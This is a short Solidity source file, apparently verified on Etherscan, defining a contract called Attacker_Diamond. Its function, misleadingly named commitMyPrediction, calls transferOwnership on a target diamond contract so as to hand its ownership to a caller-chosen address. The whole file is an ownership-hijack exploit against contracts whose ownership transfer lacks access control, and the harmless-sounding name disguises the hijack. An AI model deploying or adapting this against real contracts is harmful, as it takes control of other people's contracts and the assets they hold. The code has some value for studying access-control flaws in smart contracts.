/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

pragma solidity ^0.8.16;

interface IERC173 {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() external view returns (address owner_);
    function transferOwnership(address _newOwner) external;
}

contract Attacker_Diamond {

    function commitMyPrediction(address diamond_add, address new_owner) external {
        IERC173 DiamondContract = IERC173(diamond_add);
  
        //This is example and not related to your contract
        DiamondContract.transferOwnership(new_owner);
    }

//    function checkMyPrediction(address diamond_add) external {
//        IERC173 DiamondContract = IERC173(diamond_add);
//  
//        //This is example and not related to your contract
//        DiamondContract.checkPrediction();
//    }

}